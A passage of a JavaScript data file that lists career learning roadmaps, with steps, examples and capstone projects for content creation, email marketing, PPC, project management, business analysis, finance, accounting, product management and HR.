                title: "Content Strategy & Production",
                modules: [
                    {
                        id: "cc-1", title: "Content Creation & Growth",
                        steps: [
                            { id: "cc-1", title: "Finding Your Niche", description: "Positioning at the intersection of passion, skill, and demand.", example: "Finance × Gen Z; Fitness × busy professionals; Tech × beginners." },
                            { id: "cc-2", title: "Content Pillars", description: "3-5 core topics that define your brand.", example: "Pillar 1: Tips; Pillar 2: Reviews; Pillar 3: Behind-the-scenes; Pillar 4: Q&A." },
                            { id: "cc-3", title: "Storytelling Framework", description: "Hook → Context → Value → CTA structure.", example: "'I failed 3 times before this worked.' (hook) → story → lesson → subscribe." },
                            { id: "cc-4", title: "YouTube SEO & Algorithm", description: "Titles, thumbnails, watch time, CTR.", example: "Target 10%+ CTR; 60%+ average view duration; rank for long-tail keywords." },
                            { id: "cc-5", title: "Video Production Basics", description: "Camera, lighting, audio, editing.", example: "Good audio > good video; ring light; shotgun mic; DaVinci Resolve free." },
                            { id: "cc-6", title: "Podcast Production", description: "Recording, editing, distributing episodes.", example: "Audacity/Adobe Audition; export MP3 128kbps; distribute via Buzzsprout/RSS." },
                            { id: "cc-7", title: "Blog & Article Writing", description: "SEO-optimized written content.", example: "SurferSEO or Clearscope for optimization; aim for 1800+ words for rankings." },
                            { id: "cc-8", title: "Short-Form Video (Reels/Shorts/TikTok)", description: "Viral-optimized vertical video.", example: "Hook in first 1-2s; scroll-stopping visual; trending audio; strong CTA." },
                            { id: "cc-9", title: "Email Newsletter", description: "Building a direct audience relationship.", example: "Beehiiv, ConvertKit; weekly newsletter → 1 tip + recommendation + personal story." },
                            { id: "cc-10", title: "Community Building", description: "Discord, Patreon, Slack for loyal fans.", example: "Patreon tiers: $5 (Q&A), $15 (detailed guides), $30 (monthly call)." },
                            { id: "cc-11", title: "Monetization Models", description: "AdSense, sponsorships, digital products, courses.", example: "Phases: ads first → affiliate → sponsorship → digital product → courses." },
                            { id: "cc-12", title: "Brand Deals & Sponsorships", description: "Pitching, negotiating, executing branded content.", example: "Media kit: audience demographics, engagement rate, content examples." },
                            { id: "cc-13", title: "Digital Products", description: "Ebooks, templates, presets, Notion dashboards.", example: "Gumroad: sell a Notion content calendar template for $19." },
                            { id: "cc-14", title: "Online Courses", description: "Creating and selling educational content.", example: "Kajabi, Teachable, Podia for hosting; $197 cohort course; evergreen funnel." },
                            { id: "cc-15", title: "Audience Growth Tactics", description: "Collaborations, cross-posting, trends.", example: "Collab with creator in adjacent niche; post same content to all platforms." },
                            { id: "cc-16", title: "Analytics & Iteration", description: "Using data to double down on what works.", example: "YouTube Analytics: find highest traffic video → make 3 more on same topic." },
                            { id: "cc-17", title: "Batch Content Creation", description: "Filming/writing multiple pieces in one session.", example: "Record 4 videos on Monday; edit and schedule for the week." },
                            { id: "cc-18", title: "Content Repurposing", description: "One idea → multiple formats.", example: "Blog post → YouTube video → 3 Reels → Twitter thread → newsletter." },
                            { id: "cc-19", title: "Legal for Creators", description: "Copyright, FTC disclosures, contracts.", example: "#ad or #paid for sponsored posts; music licensing; contract for brand deals." },
                            { id: "cc-20", title: "Creator Burnout Prevention", description: "Sustainable content cadence and systems.", example: "Batch recording; templates; hire editor when revenue allows; weekly rest days." }
                        ]
                    }
                ],
                project: "Launch a content channel: 30 days of consistent posting across 2 platforms, with a newsletter, and first monetization attempt."
            }
        ]
    },
    emailmarketing: {
        title: "Email Marketing Roadmap",
        stages: [
            {
                title: "Email Strategy & Automation",
                modules: [
                    {
                        id: "em-1", title: "Email Marketing Fundamentals",
                        steps: [
                            { id: "em-1", title: "Why Email Marketing?", description: "Highest ROI channel: $36 for every $1 spent.", example: "Email list is owned; social media reach is rented." },
                            { id: "em-2", title: "Email Service Providers (ESPs)", description: "Mailchimp, Klaviyo, ConvertKit, ActiveCampaign.", example: "Klaviyo: best for ecommerce; ConvertKit: best for creators; Mailchimp: general." },
                            { id: "em-3", title: "List Building Strategies", description: "Lead magnets, pop-ups, landing pages.", example: "Offer free ebook/checklist → capture email → deliver instantly via automation." },
                            { id: "em-4", title: "Segmentation", description: "Grouping subscribers by behavior, preferences, demographics.", example: "Segment by: purchased/not purchased; clicked link/didn't; location; signup source." },
                            { id: "em-5", title: "Email Design Best Practices", description: "Mobile-first, single column, clear CTA.", example: "Max-width 600px; 16px body font; single CTA button above the fold." },
                            { id: "em-6", title: "Subject Lines & Pre-header", description: "Writing lines that get opened.", example: "Curiosity: 'You're doing this wrong...'; Personalization: 'John, your cart is waiting'." },
                            { id: "em-7", title: "Welcome Email Sequence", description: "Onboarding new subscribers.", example: "Day 0: Welcome + gift; Day 1: Your story; Day 3: Best content; Day 7: First offer." },
                            { id: "em-8", title: "Drip Campaigns", description: "Automated timed sequences for lead nurturing.", example: "Downloaded whitepaper → day 1 email → day 3 → day 7 → sales call invite." },
                            { id: "em-9", title: "Broadcast Emails", description: "One-time sends to full list or segment.", example: "Weekly newsletter; product launch email; holiday promotion." },
                            { id: "em-10", title: "Abandoned Cart Emails", description: "Recovering lost e-commerce revenue.", example: "1hr after abandon: reminder; 24hr: social proof; 72hr: 10% discount." },
                            { id: "em-11", title: "Re-engagement Campaigns", description: "Winning back inactive subscribers.", example: "'We miss you! Here's 15% off' → if still inactive → unsubscribe to clean list." },
                            { id: "em-12", title: "A/B Testing Emails", description: "Testing subject lines, CTAs, send times.", example: "A: 'Huge sale!' vs B: 'Today only: 40% off' → track open and click rates." },
                            { id: "em-13", title: "Email Deliverability", description: "SPF, DKIM, DMARC, list hygiene.", example: "Set up SPF/DKIM records; boot inactive subscribers; avoid spam trigger words." },
                            { id: "em-14", title: "Personalization & Dynamic Content", description: "Tailoring emails to individual subscribers.", example: "{{first_name}} in subject; show product recs based on browse history." },
                            { id: "em-15", title: "Behavioral Triggers", description: "Automated emails based on actions.", example: "User visits pricing page → trigger 'Anything I can help?' email." },
                            { id: "em-16", title: "Post-Purchase Sequences", description: "Order confirmation, shipping, review request, cross-sell.", example: "Day 0: Order confirm; Day 3: Shipping; Day 10: How to use; Day 20: Review request." },
                            { id: "em-17", title: "Email Analytics & KPIs", description: "Open rate, CTR, conversion rate, list growth, unsubscribes.", example: "Target open rate: >25%; CTR: >3%; unsubscribe rate: <0.5%." },
                            { id: "em-18", title: "Transactional Emails", description: "Order confirmations, password resets, receipts.", example: "Sent via SendGrid/SES; must be reliable; always branded." },
                            { id: "em-19", title: "GDPR & CAN-SPAM Compliance", description: "Permission-based marketing, opt-out requirements.", example: "Double opt-in; visible unsubscribe; include physical address; honor opt-outs in 10 days." },
                            { id: "em-20", title: "Advanced Automation (Customer Journeys)", description: "Complex multi-step, conditional automation flows.", example: "If purchased product A → recommend product B; if not → send educational content." }
                        ]
                    }
                ],
                project: "Build a full email funnel: lead magnet, landing page, welcome sequence, weekly broadcast, and abandoned cart flow with A/B testing."
            }
        ]
    },
    ppcspecialist: {
        title: "PPC Specialist Roadmap",
        stages: [
            {
                title: "Paid Advertising & Optimization",
                modules: [
                    {
                        id: "ppc-1", title: "Paid Search & Social Advertising",
                        steps: [
                            { id: "ppc-1", title: "PPC Fundamentals", description: "Pay-per-click model, auction system, Quality Score.", example: "Google Ads auction: bid × Quality Score = Ad Rank." },
                            { id: "ppc-2", title: "Google Ads Campaign Structure", description: "Account → Campaign → Ad Group → Ads → Keywords.", example: "Campaign: sneakers; Ad group: running shoes; Keywords: buy running shoes." },
                            { id: "ppc-3", title: "Keyword Match Types", description: "Broad, phrase, exact, and negative keywords.", example: "Exact [running shoes]; Phrase 'buy running shoes'; Broad running shoes." },
                            { id: "ppc-4", title: "Search Ad Copywriting", description: "Headlines, descriptions, ad extensions.", example: "Headline 1: 'Best Running Shoes 2024'; Description: 'Free shipping over $50. Shop now.'" },
                            { id: "ppc-5", title: "Quality Score Optimization", description: "CTR, ad relevance, landing page experience.", example: "Tight keyword groups → highly relevant ads → fast landing page = high QS." },
                            { id: "ppc-6", title: "Bidding Strategies", description: "Manual CPC, Target CPA, Target ROAS, Maximize conversions.", example: "Start with manual CPC → enough data → switch to Target CPA." },
                            { id: "ppc-7", title: "Google Display Network", description: "Banner ads across millions of websites.", example: "Target audiences by interest, intent, demographics, placements." },
                            { id: "ppc-8", title: "Google Shopping (Performance Max)", description: "Product listing ads from Merchant Center feed.", example: "Upload product feed → PMax campaign → Google optimizes placements." },
                            { id: "ppc-9", title: "YouTube Ads", description: "In-stream, bumper, discovery ad formats.", example: "Skippable in-stream: 5s forced view; TrueView: pay only if watched 30s+." },
                            { id: "ppc-10", title: "Facebook & Instagram Ads", description: "Campaign objectives, audiences, creative formats.", example: "Objective: conversions; Audience: lookalike 1%; Creative: single image + carousel A/B." },
                            { id: "ppc-11", title: "Custom Audiences & Retargeting", description: "Reaching people who visited your site or watched your video.", example: "Website visitors last 30 days → retarget with discount ad." },
                            { id: "ppc-12", title: "Lookalike Audiences", description: "Finding new prospects similar to existing customers.", example: "Upload customer list → 1% lookalike of top purchasers → most qualified." },
                            { id: "ppc-13", title: "Conversion Tracking", description: "Tracking purchases, leads, and micro-conversions.", example: "Google Ads conversion tag on thank-you page; Enhanced conversions." },
                            { id: "ppc-14", title: "Landing Page Optimization (CRO)", description: "Matching ad message to landing page; fast load speed.", example: "Ad: '40% off sneakers' → LP headline: '40% off all sneakers today'." },
                            { id: "ppc-15", title: "A/B Testing Ads", description: "Testing headlines, creatives, CTAs.", example: "Google Ads Experiments: 50/50 split; run 2 weeks; check statistical significance." },
                            { id: "ppc-16", title: "PPC Reporting & KPIs", description: "Impressions, CTR, CPC, CPA, ROAS, conversion rate.", example: "ROAS = revenue / ad spend; target > 4x for profitability." },
                            { id: "ppc-17", title: "Auction Insights", description: "Benchmarking against competitors in the same auctions.", example: "Impression share, overlap rate, position above rate vs competitors." },
                            { id: "ppc-18", title: "Budget Management", description: "Daily vs monthly budgets, budget pacing.", example: "Monthly budget $5000 → daily $167; monitor spend weekly; shift to high ROAS campaigns." },
                            { id: "ppc-19", title: "LinkedIn Ads", description: "B2B targeting with professional attributes.", example: "Lead gen forms; Sponsored InMail; target by job function + seniority." },
                            { id: "ppc-20", title: "Certifications", description: "Google Ads, Meta Blueprint certifications.", example: "Google Ads Search Certification; Meta Certified Media Planning Professional." }
                        ]
                    }
                ],
                project: "Launch, manage, and optimize a Google Ads search campaign — hit target CPA under $30 within 60 days."
            }
        ]
    },
    projectmanager: {
        title: "Project Management Roadmap",
        stages: [
            {
                title: "Methodologies, Tools & Leadership",
                modules: [
                    {
                        id: "pm-1", title: "Project Management Fundamentals",
                        steps: [
                            { id: "pm-1", title: "Project Management Basics", description: "Scope, time, cost, quality, risk, stakeholders.", example: "Project charter: defines scope, objectives, budget, timeline, stakeholders." },
                            { id: "pm-2", title: "Waterfall Methodology", description: "Sequential phases: Initiation → Planning → Execution → Closure.", example: "Construction project: requirements fixed upfront; strict phase gates." },
                            { id: "pm-3", title: "Agile Methodology", description: "Iterative sprints; adaptive planning; customer collaboration.", example: "Scrum: 2-week sprints; daily standup; sprint review; retrospective." },
                            { id: "pm-4", title: "Scrum Framework", description: "Roles: Product Owner, Scrum Master, Dev Team.", example: "PO writes user stories; Scrum Master removes blockers; team self-organizes." },
                            { id: "pm-5", title: "Kanban", description: "Visual workflow; WIP limits; continuous flow.", example: "Kanban board: Backlog → In Progress (WIP: 3) → Review → Done." },
                            { id: "pm-6", title: "Work Breakdown Structure (WBS)", description: "Decomposing project deliverables into tasks.", example: "Website redesign → UX design, frontend dev, backend dev, testing, launch." },
                            { id: "pm-7", title: "Gantt Charts & Scheduling", description: "Timeline visualization of tasks and dependencies.", example: "MS Project or TeamGantt; critical path method (CPM)." },
                            { id: "pm-8", title: "Risk Management", description: "Identifying, assessing, and mitigating risks.", example: "Risk register: Risk → likelihood → impact → mitigation → owner." },
                            { id: "pm-9", title: "Budget & Cost Management", description: "Earned Value Management, cost variance.", example: "EV = budgeted cost of work performed; SPI = EV/PV; CPI = EV/AC." },
                            { id: "pm-10", title: "Stakeholder Management", description: "Identifying and engaging stakeholders effectively.", example: "Stakeholder map: Power vs Interest matrix; tailor comms to each quadrant." },
                            { id: "pm-11", title: "Communication Planning", description: "Who gets what information, how, and when.", example: "Weekly status report to sponsors; daily standups with team; RACI matrix." },
                            { id: "pm-12", title: "Project Management Tools (Jira/Asana)", description: "Digital tools for tracking tasks and progress.", example: "Jira: epics → stories → tasks; dashboards; burndown charts." },
                            { id: "pm-13", title: "Change Management", description: "Managing scope changes through formal process.", example: "Change request → impact analysis → approval → update baseline." },
                            { id: "pm-14", title: "Quality Management", description: "QA processes, acceptance criteria, testing.", example: "Definition of Done; sprint review; user acceptance testing (UAT)." },
                            { id: "pm-15", title: "Procurement Management", description: "Vendor selection, contracts, SOW.", example: "RFP → vendor evaluation → contract → SLA management." },
                            { id: "pm-16", title: "Project Closure", description: "Lessons learned, documentation, formal sign-off.", example: "Closure checklist; retrospective report; archive all project documents." },
                            { id: "pm-17", title: "OKRs & KPIs", description: "Setting and tracking objectives and key results.", example: "Objective: Launch product; KR1: ship by Q3; KR2: NPS > 45; KR3: 0 critical bugs." },
                            { id: "pm-18", title: "Leadership & Team Dynamics", description: "Situational leadership, conflict resolution, motivation.", example: "Tuckman's model: Forming → Storming → Norming → Performing." },
                            { id: "pm-19", title: "Remote Project Management", description: "Managing distributed teams effectively.", example: "Async updates; overlap hours for collaboration; virtual retrospectives." },
                            { id: "pm-20", title: "PMP & PRINCE2 Certifications", description: "Industry-recognized project management credentials.", example: "PMP: 35 hours experience + exam; PRINCE2 Foundation + Practitioner." }
                        ]
                    }
                ],
                project: "Plan and execute a real or simulation project using Agile: sprint planning, daily standups, stakeholder reporting, and retrospective."
            }
        ]
    },
    businessanalyst: {
        title: "Business Analyst Roadmap",
        stages: [
            {
                title: "Requirements, Analysis & Modeling",
                modules: [
                    {
                        id: "ba-1", title: "Business Analysis Fundamentals",
                        steps: [
                            { id: "ba-1", title: "What is a Business Analyst?", description: "Bridge between stakeholders and technical teams.", example: "Translate business need: 'we lose customers at checkout' → functional requirements for dev team." },
                            { id: "ba-2", title: "BABOK Framework", description: "Business Analysis Body of Knowledge.", example: "6 knowledge areas: Planning, Elicitation, Requirements Management, etc." },
                            { id: "ba-3", title: "Stakeholder Identification", description: "Mapping who is affected by the solution.", example: "Stakeholder register: Name, role, interest, influence, comms frequency." },
                            { id: "ba-4", title: "Elicitation Techniques", description: "Interviews, workshops, surveys, observation, document analysis.", example: "Run a facilitated workshop: brainstorm pain points → group → prioritize." },
                            { id: "ba-5", title: "User Stories", description: "As a [user], I want [goal] so that [benefit].", example: "As a shopper, I want to save items to a wishlist so I can buy them later." },
                            { id: "ba-6", title: "Use Cases", description: "Describing system interactions from user perspective.", example: "Use Case: Place Order; Actors: Customer; Steps: select items → checkout → confirm." },
                            { id: "ba-7", title: "Functional Requirements", description: "What the system must do.", example: "FR-01: The system shall send a confirmation email within 60 seconds of order placement." },
                            { id: "ba-8", title: "Non-Functional Requirements", description: "Performance, security, scalability, usability.", example: "NFR-01: The system shall respond to search queries within 2 seconds under 1000 concurrent users." },
                            { id: "ba-9", title: "Business Requirements Document (BRD)", description: "Formal documentation of business needs and requirements.", example: "BRD sections: Executive summary, Business objective, Scope, Requirements, Assumptions." },
                            { id: "ba-10", title: "Process Modeling (BPMN)", description: "Documenting business processes visually.", example: "Customer places order (start) → payment validated? → yes: fulfill; no: notify (end)." },
                            { id: "ba-11", title: "Data Flow Diagrams", description: "Showing how data moves through a system.", example: "External entity → process → data store → external entity." },
                            { id: "ba-12", title: "Gap Analysis", description: "Comparing As-Is vs To-Be state.", example: "Current process: manual invoice approval (5 days) → future: automated (2 hours)." },
                            { id: "ba-13", title: "Cost-Benefit Analysis", description: "Justifying investments with financial analysis.", example: "Cost: $200k implementation; Benefit: $80k/yr savings; ROI in 2.5 years." },
                            { id: "ba-14", title: "Wireframes & Mockups", description: "Visual representations of solution for stakeholder validation.", example: "Balsamiq wireframes; review with stakeholders; iterate before dev begins." },
                            { id: "ba-15", title: "Requirements Prioritization (MoSCoW)", description: "Must have, Should have, Could have, Won't have.", example: "P1 Must: user login; P2 Should: remember me; P3 Could: biometric login." },
                            { id: "ba-16", title: "Agile BA Practices", description: "Working in Scrum as a BA alongside Product Owner.", example: "Write acceptance criteria for user stories; participate in sprint reviews." },
                            { id: "ba-17", title: "UAT (User Acceptance Testing)", description: "Verifying solution meets business requirements.", example: "UAT test script; test cases; sign-off before production release." },
                            { id: "ba-18", title: "SQL for Business Analysts", description: "Querying databases for data analysis.", example: "SELECT COUNT(*), SUM(revenue) FROM orders WHERE date >= '2024-01-01' GROUP BY region" },
                            { id: "ba-19", title: "Dashboard Reporting (Power BI/Tableau)", description: "Turning data into actionable business insights.", example: "Power BI: connect to SQL → create measures → build KPI dashboard." },
                            { id: "ba-20", title: "CBAP Certification", description: "Certified Business Analysis Professional exam.", example: "Requires 7,500 hours of BA experience + 21 PD hours." }
                        ]
                    }
                ],
                project: "Conduct a full BA engagement: stakeholder interviews, As-Is/To-Be process map, BRD, wireframes, and UAT test plan."
            }
        ]
    },
    financialanalyst: {
        title: "Financial Analyst Roadmap",
        stages: [
            {
                title: "Financial Modeling & Analysis",
                modules: [
                    {
                        id: "fa-1", title: "Finance & Modeling Fundamentals",
                        steps: [
                            { id: "fa-1", title: "Financial Statement Analysis", description: "Reading the income statement, balance sheet, cash flow statement.", example: "Revenue - COGS = Gross Profit; Net Income / Revenue = Net Margin." },
                            { id: "fa-2", title: "Financial Ratios", description: "Liquidity, profitability, leverage, efficiency ratios.", example: "Current Ratio = Current Assets / Current Liabilities; ROE = Net Income / Equity." },
                            { id: "fa-3", title: "Excel for Finance", description: "VLOOKUP, INDEX/MATCH, IF, SUMIFS, PivotTables.", example: "=XLOOKUP(ticker, tickers_col, price_col); PivotTable for monthly revenue by product." },
                            { id: "fa-4", title: "Financial Modeling Basics", description: "3-statement model: Income Statement, Balance Sheet, Cash Flow.", example: "Link IS net income → BS retained earnings → CF operations: all three must balance." },
                            { id: "fa-5", title: "DCF Valuation", description: "Discounting future cash flows to present value.", example: "WACC = 10%; FCF Year 1-5 projected; Terminal Value = FCF5*(1+g)/(r-g)." },
                            { id: "fa-6", title: "Comparable Company Analysis (Comps)", description: "Valuing a company relative to peers.", example: "EV/EBITDA: peer median 15x → target EBITDA $40M → EV = $600M." },
                            { id: "fa-7", title: "Precedent Transaction Analysis", description: "M&A transaction multiples for valuation.", example: "Average acquisition EV/Revenue 3x → target revenue $100M → valuation $300M." },
                            { id: "fa-8", title: "Budgeting & Forecasting", description: "Creating annual budgets and quarterly forecasts.", example: "Zero-based budget; rolling 12-month forecast; variance analysis: actual vs budget." },
                            { id: "fa-9", title: "Sensitivity Analysis", description: "Testing model assumptions with data tables.", example: "Excel data table: WACC (8-12%) vs Revenue Growth (2-8%) → equity value grid." },
                            { id: "fa-10", title: "Scenario Analysis", description: "Bear, base, bull cases.", example: "Base: 10% growth; Bull: 20%; Bear: 0%; present all to management." },
                            { id: "fa-11", title: "LBO Modeling", description: "Leveraged buyout analysis.", example: "$100M acquisition; 70% debt; 5yr hold; target IRR > 20%." },
                            { id: "fa-12", title: "Accounting Fundamentals (Debits & Credits)", description: "Understanding the accounting backbone of models.", example: "DR Cash $100K / CR Revenue $100K; GAAP revenue recognition." },
                            { id: "fa-13", title: "Capital Budgeting (NPV, IRR, Payback)", description: "Evaluating investment opportunities.", example: "NPV > 0 → add value; IRR > hurdle rate → invest; Payback < 3yr → liquid." },
                            { id: "fa-14", title: "Working Capital Management", description: "Managing the cycle: inventory → receivables → payables.", example: "Cash conversion cycle = DIO + DSO - DPO; shorter = better." },
                            { id: "fa-15", title: "Bloomberg Terminal Basics", description: "Professional financial data platform.", example: "BDH() for historical data; FA for fundamentals; WACC for cost of capital." },
                            { id: "fa-16", title: "Power BI / Tableau for Finance", description: "Visualizing financial data for stakeholders.", example: "Monthly P&L dashboard; revenue waterfall; KPI scorecards." },
                            { id: "fa-17", title: "Python for Finance", description: "Automating data pulls and quantitative analysis.", example: "yfinance; pandas for data manipulation; matplotlib for charts." },
                            { id: "fa-18", title: "Equity Research", description: "Writing buy/sell/hold research reports.", example: "Company overview → industry analysis → financial model → price target → recommendation." },
                            { id: "fa-19", title: "M&A Process", description: "Deal process: origination → due diligence → signing → closing.", example: "Buy-side: NDA → teaser → IM → management presentations → LOI → diligence → SPA." },
                            { id: "fa-20", title: "CFA Certification Path", description: "Chartered Financial Analyst — 3 levels.", example: "Level 1: ethics, quant, economics; Level 2: valuation; Level 3: portfolio management." }
                        ]
                    }
                ],
                project: "Build a complete 3-statement financial model for a public company with DCF valuation, comps analysis, and sensitivity tables."
            }
        ]
    },
    accountant: {
        title: "Accountant Roadmap",
        stages: [
            {
                title: "Accounting Principles & Practice",
                modules: [
                    {
                        id: "ac-1", title: "Accounting Fundamentals",
                        steps: [
                            { id: "ac-1", title: "Accounting Equation", description: "Assets = Liabilities + Equity.", example: "Cash $50K (asset) = Loan $30K (liability) + Owner equity $20K." },
                            { id: "ac-2", title: "Debits & Credits", description: "Double-entry bookkeeping foundation.", example: "DR Cash 100 / CR Revenue 100 — every debit has an equal credit." },
                            { id: "ac-3", title: "Chart of Accounts", description: "Organized list of all accounts.", example: "Assets (1xxx), Liabilities (2xxx), Equity (3xxx), Revenue (4xxx), Expenses (5xxx)." },
                            { id: "ac-4", title: "Journal Entries", description: "Recording transactions in chronological order.", example: "DR Office Supplies 500 / CR Cash 500 — purchased supplies for cash." },
                            { id: "ac-5", title: "General Ledger & Trial Balance", description: "Posting entries to accounts; checking balance.", example: "Sum all DR = sum all CR; if equal, trial balance is balanced." },
                            { id: "ac-6", title: "Income Statement (P&L)", description: "Revenue minus expenses = net income.", example: "Revenue $500K - COGS $200K - OpEx $150K = Net Income $150K." },
                            { id: "ac-7", title: "Balance Sheet", description: "Snapshot of assets, liabilities, equity at a point in time.", example: "Total assets must equal total liabilities + equity." },
                            { id: "ac-8", title: "Cash Flow Statement", description: "Cash from operations, investing, financing.", example: "Operating CF: Net income + D&A - ΔWorking Capital." },
                            { id: "ac-9", title: "Accounts Payable & Receivable", description: "Managing money owed and money due.", example: "AP aging report; AR collection calls; net 30 payment terms." },
                            { id: "ac-10", title: "Bank Reconciliation", description: "Matching cash book to bank statement.", example: "Identify and explain differences: timing, outstanding checks, bank errors." },
                            { id: "ac-11", title: "Payroll Processing", description: "Computing gross pay, deductions, net pay, taxes.", example: "PF, TDS, gratuity (India); 401k, FICA, federal/state tax (US)." },
                            { id: "ac-12", title: "Fixed Assets & Depreciation", description: "Capitalizing and depreciating long-term assets.", example: "Straight-line: (Cost - Residual) / Useful life; Reducing balance method." },
                            { id: "ac-13", title: "Inventory Accounting (FIFO/LIFO/WAC)", description: "Valuing inventory for COGS and balance sheet.", example: "FIFO in inflation → lower COGS → higher profit; LIFO opposite." },
                            { id: "ac-14", title: "Tax Accounting Basics", description: "Corporate tax, GST/VAT, withholding tax.", example: "Corporate tax: taxable income × applicable rate; GST input credit." },
                            { id: "ac-15", title: "GAAP vs IFRS", description: "US Generally Accepted Accounting Principles vs International.", example: "LIFO allowed under GAAP; prohibited under IFRS." },
                            { id: "ac-16", title: "Accounting Software (QuickBooks/SAP)", description: "Practical software skills for modern accountants.", example: "QuickBooks: create invoices, run reports; SAP FI module for enterprise." },
                            { id: "ac-17", title: "Audit & Internal Controls", description: "Ensuring financial accuracy and preventing fraud.", example: "Segregation of duties; three-way match for AP; periodic reconciliations." },
                            { id: "ac-18", title: "Management Accounting", description: "Internal reports for decision-making.", example: "Cost-volume-profit analysis; break-even = Fixed Costs / (Price - Variable Cost)." },
                            { id: "ac-19", title: "Financial Closing Process", description: "Month-end and year-end closing steps.", example: "Post accruals → reconcile accounts → run trial balance → prepare statements → close." },
                            { id: "ac-20", title: "CPA / ACCA / CMA Certification", description: "Professional accounting credentials.", example: "CPA (US): 150 credit hours + exam; ACCA (UK/global); CMA for management accounting." }
                        ]
                    }
                ],
                project: "Prepare a complete set of financial statements (IS, BS, CF) for a mock company using QuickBooks or Excel."
            }
        ]
    },
    productmanager: {
        title: "Product Management Roadmap",
        stages: [
            {
                title: "Product Strategy, Execution & Growth",
                modules: [
                    {
                        id: "prod-1", title: "Product Management Fundamentals",
                        steps: [
                            { id: "prod-1", title: "What is a Product Manager?", description: "The CEO of the product; owns vision, strategy, roadmap.", example: "PM defines 'what and why'; engineering decides 'how and when'." },
                            { id: "prod-2", title: "Product Discovery", description: "Understanding user problems through research.", example: "User interviews, surveys, support tickets, usage data — find real pain points." },
                            { id: "prod-3", title: "Product-Market Fit", description: "When your product genuinely satisfies strong market demand.", example: "Sean Ellis test: >40% users would be 'very disappointed' if product disappeared." },
                            { id: "prod-4", title: "Market Research & Competitive Analysis", description: "Understanding market size and competition.", example: "TAM/SAM/SOM; competitor feature matrix; positioning map." },
                            { id: "prod-5", title: "User Personas & Jobs-to-be-Done", description: "Modeling users and their core needs.", example: "JTBD: 'When I am a busy executive, I want a 1-click travel booking so I save time'." },
                            { id: "prod-6", title: "Product Vision & Strategy", description: "Long-term direction and how to get there.", example: "Spotify vision: 'Universal music access'; strategy: freemium → premium; artist tools." },
                            { id: "prod-7", title: "Product Roadmapping", description: "Planning features over time aligned to strategy.", example: "Now/Next/Later roadmap; outcome-based roadmap: don't ship features, ship outcomes." },
                            { id: "prod-8", title: "Prioritization Frameworks", description: "RICE, MoSCoW, Kano model, ICE.", example: "RICE = Reach × Impact × Confidence / Effort; highest score = prioritize first." },
                            { id: "prod-9", title: "User Stories & Acceptance Criteria", description: "Translating product decisions to engineering.", example: "As a new user, I want to sign up with Google so I reduce friction. AC: OAuth2 flow works." },
                            { id: "prod-10", title: "Working with Engineering", description: "Sprint planning, backlog grooming, sprint reviews.", example: "PM writes stories → grooming with eng to estimate → sprint planning → review." },
                            { id: "prod-11", title: "Working with Design (UX)", description: "Design thinking, wireframe reviews, UX handoffs.", example: "PM defines problem; Design creates solution; PM validates with users." },
                            { id: "prod-12", title: "Data-Driven Product Decisions", description: "Using analytics to guide features.", example: "Funnel: Signup(80%) → Onboard(60%) → Activate(30%) → fix onboarding drop." },
                            { id: "prod-13", title: "A/B Testing & Experimentation", description: "Running controlled experiments to validate changes.", example: "Control: old checkout flow; Variant: 1-page checkout; run 2 weeks; measure conversion." },
                            { id: "prod-14", title: "Product Metrics & KPIs", description: "DAU, MAU, retention, churn, NPS, ARR, LTV/CAC.", example: "North Star Metric: Spotify = time spent listening; Airbnb = nights booked." },
                            { id: "prod-15", title: "Go-To-Market Strategy", description: "How you'll launch and position the product.", example: "GTM: pricing, channels, launch sequence, sales enablement, PR." },
                            { id: "prod-16", title: "Pricing Strategy", description: "Freemium, subscription, usage-based, enterprise.", example: "Freemium: free plan → upsell to pro; usage-based: AWS charges per API call." },
                            { id: "prod-17", title: "Customer Feedback Loops", description: "Systems for continuous user input.", example: "In-app NPS survey; Mixpanel cohort analysis; weekly user interviews." },
                            { id: "prod-18", title: "Product Communication", description: "Stakeholder updates, launch communications, PRDs.", example: "1-pager PRD: Problem, Goal, Solution, Success Metrics, Out of scope." },
                            { id: "prod-19", title: "Growth & Retention", description: "Acquisition, activation, retention, referral, revenue (AARRR).", example: "Pirate metrics: Acquisition 1000 → Activation 600 → Retention 300 → Revenue 100." },
                            { id: "prod-20", title: "PM Certifications & Career", description: "PSPO, AIPMM, Google PM career prep.", example: "Cracking PM Interview; Lenny's Newsletter; build a portfolio of case studies." }
                        ]
                    }
                ],
                project: "Create a complete product spec: problem statement, user research, roadmap, prioritized backlog, metrics, and GTM strategy."
            }
        ]
    },
    hrspecialist: {
        title: "HR Specialist Roadmap",
        stages: [
            {
                title: "Talent, Operations & People Culture",
                modules: [
                    {
                        id: "hr-1", title: "Human Resources Fundamentals",
                        steps: [
                            { id: "hr-1", title: "HR Functions Overview", description: "Recruitment, onboarding, L&D, compensation, ER, compliance.", example: "HR business partner model: strategic partner to each department." },
                            { id: "hr-2", title: "Talent Acquisition Process", description: "Job analysis → JD → sourcing → screening → interviewing → offer.", example: "Write JD with Ongig; source on LinkedIn; screen by resume + ATS; structured interview." },
                            { id: "hr-3", title: "Applicant Tracking Systems (ATS)", description: "Managing candidates through the hiring pipeline.", example: "Greenhouse, Workday, Lever; configure stages; automate email responses." },
                            { id: "hr-4", title: "Interviewing Techniques", description: "Behavioral, competency-based, structured interviews.", example: "STAR: Situation, Task, Action, Result — 'Tell me about a time you handled conflict.'" },
                            { id: "hr-5", title: "Onboarding Best Practices", description: "Ramping new hires to productivity.", example: "Week 1: culture + tools; Month 1: role goals; Month 3: first performance check-in." },
                            { id: "hr-6", title: "Employee Relations", description: "Managing conflict, disciplinary action, grievances.", example: "Progressive discipline: verbal → written warning → PIP → termination." },
                            { id: "hr-7", title: "Performance Management", description: "Goal setting, performance reviews, PIPs.", example: "OKRs or SMART goals; quarterly reviews; 360-degree feedback." },
                            { id: "hr-8", title: "Compensation & Benefits", description: "Job leveling, salary bands, equity, benefits design.", example: "Radford survey for benchmarking; total comp: base + bonus + equity + benefits." },
                            { id: "hr-9", title: "Learning & Development", description: "Employee training, skills development, career paths.", example: "LMS: Coursera for Business; mentoring programs; leadership development tracks." },
                            { id: "hr-10", title: "HR Compliance & Employment Law", description: "Labor laws, discrimination, harassment, FMLA.", example: "EEOC; Title VII; ADA; GDPR for employee data; WARN Act for layoffs." },
                            { id: "hr-11", title: "Diversity, Equity & Inclusion (DEI)", description: "Building inclusive, equitable workplaces.", example: "Blind recruitment; inclusive JDs; ERGs; DEI metrics: hire, promote, retain rates." },
                            { id: "hr-12", title: "HR Information Systems (HRIS)", description: "Workday, BambooHR, SAP SuccessFactors.", example: "Self-service portal for payroll, time-off, benefits enrollment." },
